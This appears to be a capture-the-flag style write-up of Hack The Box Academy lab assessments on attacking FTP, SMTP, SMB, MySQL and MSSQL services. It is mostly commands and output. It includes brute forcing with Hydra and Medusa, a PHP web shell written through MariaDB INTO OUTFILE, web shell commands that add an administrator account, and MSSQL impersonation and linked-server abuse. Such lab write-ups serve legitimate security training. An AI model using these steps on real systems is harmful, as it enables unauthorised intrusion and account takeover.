---
{"dg-publish":true,"permalink":"/htb-module-writeups/attacking-common-services-assessment/"}
---

```
┌─[parrot@parrot]─[~]
└──╼ $nmap -sC -sV -Pn 10.129.203.7
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 05:11 EDT
Nmap scan report for 10.129.203.7
Host is up (0.016s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL, SMBProgNeg: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open  ssl/https
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSigpipes, Support41Auth, DontAllowDatabaseTableColumn, FoundRows, SupportsTransactions, IgnoreSpaceBeforeParenthesis, ODBCClient, Speaks41ProtocolNew, InteractiveClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 517_Xz}&@QXD-Q2DAXwl
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2023-04-03T09:07:56
|_Not valid after:  2023-10-03T09:07:56
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2023-04-04T09:12:04+00:00
|_ssl-date: 2023-04-04T09:12:12+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=4/4%Time=642BE9C2%P=x86_64-pc-linux-gnu%r(NULL,
SF:41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\x
SF:2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FTP\x2
SF:0Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\
SF:r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allow
SF:ed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not
SF:\x20allowed\.\.\.\r\n")%r(Help,17B,"220\x20Core\x20FTP\x20Server\x20Ver
SF:sion\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n214-The\x20
SF:following\x20commands\x20are\x20implemented\r\n\x20\x20\x20\x20\x20USER
SF:\x20\x20PASS\x20\x20ACCT\x20\x20QUIT\x20\x20PORT\x20\x20RETR\r\n\x20\x2
SF:0\x20\x20\x20STOR\x20\x20DELE\x20\x20RNFR\x20\x20PWD\x20\x20\x20CWD\x20
SF:\x20\x20CDUP\r\n\x20\x20\x20\x20\x20MKD\x20\x20\x20RMD\x20\x20\x20NOOP\
SF:x20\x20TYPE\x20\x20MODE\x20\x20STRU\r\n\x20\x20\x20\x20\x20LIST\x20\x20
SF:NLST\x20\x20HELP\x20\x20FEAT\x20\x20UTF8\x20\x20PASV\r\n\x20\x20\x20\x2
SF:0\x20MDTM\x20\x20REST\x20\x20PBSZ\x20\x20PROT\x20\x20OPTS\x20\x20CCC\r\
SF:n\x20\x20\x20\x20\x20XCRC\x20\x20SIZE\x20\x20MFMT\x20\x20CLNT\x20\x20AB
SF:ORT\r\n214\x20\x20HELP\x20command\x20successful\r\n")%r(SMBProgNeg,41,"
SF:220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\x2064
SF:-bit\x20Unregistered\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.89 seconds

```

Since we just tried email enumeration let's see if we can find a user through mail.

```
┌─[parrot@parrot]─[~/Academy/Attacking Common Services]
└──╼ $smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Tue Apr  4 05:21:29 2023 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Tue Apr  4 05:21:32 2023 #########
1 results.

```

There's some drama with the servers requiring resets. But we finally get some creds.
```
┌─[parrot@parrot]─[~]
└──╼ $hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.138.215
Hydra v9.5-dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-04 06:11:20
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.129.138.215:21/
[21][ftp] host: 10.129.138.215   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-04 06:12:27

```

FTP has two small text Files.  docs.txt:

```
I'm testing the FTP using HTTPS, everything looks good.
```

And WebServersInfo.txt
```
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

This gives us a hint on where we should place a shell.

```
MariaDB [mysql]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/xampp/htdocs/webshell.php';
Query OK, 1 row affected (0.017 sec)

MariaDB [mysql]> 

```

Once we had our shell, we can use it to look around for the flag.  Since our shell is using administrators rights, we could also add a new user.

```

http://10.129.203.7/webshell.php?c=net%20user%20/add%20mikey%20password2

http://10.129.203.7/webshell.php?c=net%20LOCALGROUP%20%22Remote%20Desktop%20Users%22%20mikey%20/ADD

http://10.129.203.7/webshell.php?c=net%20LOCALGROUP%20%20%22Administrators%22%20mikey%20/ADD
```

In the above sequence of web shell commands, we add the user mikey:password2.
Then add mikey to the Remote Desktop Users Group.
Then add mikey to the Administrators Group.

Once we have all these, we should try practicing pulling all the hashes off the machine.


# Medium Lab
```
# Nmap 7.93 scan initiated Wed Apr  5 04:12:57 2023 as: nmap -sC -sV -Pn -oA nmapMedium 10.129.201.127
Nmap scan report for 10.129.201.127
Host is up (0.025s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp   open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp  open  pop3         Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_pop3-capabilities: AUTH-RESP-CODE STLS TOP UIDL PIPELINING CAPA RESP-CODES USER SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3     Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE CAPA USER TOP RESP-CODES PIPELINING SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
2121/tcp open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.93%I=7%D=4/5%Time=642D2D95%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8D,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.2
SF:01\.127\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  5 04:15:51 2023 -- 1 IP address (1 host up) scanned in 174.01 seconds
```

I tried the FTP and fiddled around a bit with the POP3 server.

```
┌─[✗]─[parrot@parrot]─[~/Academy/Attacking Common Services/subbrute]
└──╼ $nmap -sC -sV -Pn -p- 10.129.201.127
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-05 04:49 EDT
Stats: 0:02:52 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.28% done; ETC: 04:52 (0:00:00 remaining)
Nmap scan report for inlanefreight.htb (10.129.201.127)
Host is up (0.016s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7108b0c4f3ca9757649770f9fec50c7b (RSA)
|   256 45c3b51463993d9eb32251e59776e150 (ECDSA)
|_  256 2ec2416646efb68195d5aa3523945538 (ED25519)
53/tcp    open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
110/tcp   open  pop3         Dovecot pop3d
|_pop3-capabilities: STLS PIPELINING USER TOP SASL(PLAIN) UIDL AUTH-RESP-CODE RESP-CODES CAPA
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE CAPA TOP SASL(PLAIN) UIDL USER RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-04-11T16:38:55
|_Not valid after:  2032-04-08T16:38:55
|_ssl-date: TLS randomness does not represent time
2121/tcp  open  ccproxy-ftp?
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (InlaneFTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
30021/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.201.127]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.93%I=7%D=4/5%Time=642D3626%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8D,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.2
SF:01\.127\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
SF:r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port30021-TCP:V=7.93%I=7%D=4/5%Time=642D3626%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,90,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\[10\
SF:.129\.201\.127\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\
SF:x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cr
SF:eative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.99 seconds

```

This server allowed anonymous login and had a file in a directory for simon that was mynotes.txt.  This file had a number of notes, including what looked like some passwords.  From there, it was 

```
┌─[parrot@parrot]─[~/Academy/Attacking Common Services/MediumLab]
└──╼ $medusa -h 10.129.201.127 -u simon -P mynotes.txt -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: 234987123948729384293 (1 of 8 complete)
ACCOUNT CHECK: [ssh] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: +23358093845098 (2 of 8 complete)
ACCOUNT CHECK: [ssh] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: ThatsMyBigDog (3 of 8 complete)
ACCOUNT CHECK: [ssh] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: Rock!ng#May (4 of 8 complete)
ACCOUNT CHECK: [ssh] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: Puuuuuh7823328 (5 of 8 complete)
ACCOUNT CHECK: [ssh] Host: 10.129.201.127 (1 of 1, 0 complete) User: simon (1 of 1, 0 complete) Password: 8Ns8j1b!23hs4921smHzwn (6 of 8 complete)
ACCOUNT FOUND: [ssh] Host: 10.129.201.127 User: simon Password: 8Ns8j1b!23hs4921smHzwn [SUCCESS]
```

From there, the flag was in Simons root directory.

# HardLab

Start with nmap scan of all ports.

```
┌─[parrot@parrot]─[~/Academy/Attacking Common Services/HardLab]
└──╼ $cat nmaHardAllPorts.nmap
# Nmap 7.93 scan initiated Wed Apr  5 05:05:35 2023 as: nmap -sC -sV -Pn -p- -oA nmaHardAllPorts 10.129.203.10
Nmap scan report for 10.129.203.10
Host is up (0.017s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-04-05T09:08:10+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-05T09:05:10
|_Not valid after:  2053-04-05T09:05:10
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-04-05T09:08:10+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2023-04-05T09:07:30+00:00
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2023-04-04T09:05:00
|_Not valid after:  2023-10-04T09:05:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-04-05T09:07:35
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

```

Poke around SMB shares:
```
┌─[✗]─[parrot@parrot]─[~/Academy/Attacking Common Services/HardLab]
└──╼ $smbclient \\\\10.129.203.10\\Home
Password for [WORKGROUP\parrot]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 17:18:21 2022
  ..                                  D        0  Thu Apr 21 17:18:21 2022
  HR                                  D        0  Thu Apr 21 16:04:39 2022
  IT                                  D        0  Thu Apr 21 16:11:44 2022
  OPS                                 D        0  Thu Apr 21 16:05:10 2022
  Projects                            D        0  Thu Apr 21 16:04:48 2022

		7706623 blocks of size 4096. 3163664 blocks available
smb: \> cd Projects
smb: \Projects\> ls
  .                                   D        0  Thu Apr 21 16:04:48 2022
  ..                                  D        0  Thu Apr 21 16:04:48 2022

		7706623 blocks of size 4096. 3163664 blocks available
smb: \Projects\> cd ..
smb: \> cd IT
smb: \IT\> ls
  .                                   D        0  Thu Apr 21 16:11:44 2022
  ..                                  D        0  Thu Apr 21 16:11:44 2022
  Fiona                               D        0  Thu Apr 21 16:11:53 2022
  John                                D        0  Thu Apr 21 17:15:09 2022
  Simon                               D        0  Thu Apr 21 17:16:07 2022

		7706623 blocks of size 4096. 3163664 blocks available
smb: \IT\> cd Simon
smb: \IT\Simon\> ls
  .                                   D        0  Thu Apr 21 17:16:07 2022
  ..                                  D        0  Thu Apr 21 17:16:07 2022
  random.txt                          A       94  Thu Apr 21 17:16:48 2022

		7706623 blocks of size 4096. 3163664 blocks available
smb: \IT\Simon\> type random.txt
type: command not found
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
smb: \IT\Simon\> exit

```
Try logging in with Simon's mynotes.txt file.
```
┌─[parrot@parrot]─[~/Academy/Attacking Common Services/HardLab]
└──╼ $crackmapexec smb 10.129.203.10 -u simon -p ./mynotes.txt
SMB         10.129.203.10   445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\simon:234987123948729384293 
```

Actually, there's a lot of stuff stored openly on this SMB server. Fiona's Password is in a file she's marked as creds.txt, using that we login to RDP.

```
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
```

Login with rdesktop: `rdesktop -u fiona -p '48Ns72!bns74@S84NNNSl' 10.129.203.10`

Once logged in we can use sqlcmd: (i.e., go to CMD and type 'sqlcmd')
```
1> SELECT name FROM master.dbo.sysdatabases
2> GO
name                                                                                                                         
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                       
tempdb                                                                                                                       
model                                                                                                                        
msdb                                                                                                                         
TestingDB                                                                                                                    
TestAppDB                                                                                                                    

(6 rows affected)
1>
```

Master, tempdb, model, and msdb are all default system schemas.  So we're interested in TestingDB and TestAppDB.

Fiona can't access the TestAppDB, and the TestingDB is empty as far as Ic an tell.

```
C:\>net user

User accounts for \\WIN-HARD

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Fiona
Guest                    mssqlsvc                 WDAGUtilityAccount
The command completed successfully.
```

Look for users we can impersonate.
```
1> SELECT distinct b.name
2> from sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> on a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
name                                                                                                                         
--------------------------------------------------------------------------------------------------------------------------------
john                                                                                     
simon

```

Impersonate John.
```
1> execute as login = 'john'
2> select system_user
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
                                                                                                                             
--------------------------------------------------------------------------------------------------------------------------------
john                                                                                                                         

(1 rows affected)

-----------
          0

(1 rows affected)
```

Look for Linked Servers.
```
Msg 156, Level 15, State 1, Server WIN-HARD\SQLEXPRESS, Line 1
Incorrect syntax near the keyword 'is'.
1> SELECT srvname, isremote FROM sysservers
2> go
srvname                                                                                                                          isremote
-------------------------------------------------------------------------------------------------------------------------------- --------
WINSRV02\SQLEXPRESS                                                                                                                     1
LOCAL.TEST.LINKED.SRV                                                                                                                   0

(2 rows affected)
1> EXECUTE('select @@servername, @@version, system_user, issrvrolemember(''sysadmin'')') at [LOCAL.TEST.LINKED.SRV]
2> go
Msg 195, Level 15, State 10, Server WIN-HARD\SQLEXPRESS, Line 1
'issrvrolemember' is not a recognized built-in function name.
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') at [LOCAL.TEST.LINKED.SRV]
2> go
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
-------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------------------------------------------------------------------------------------------------------- -----------
WINSRV02\SQLEXPRESS                                                                                                              Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                                                                                     testadmin                                                                                                                                  1

(1 rows affected)
1>
```
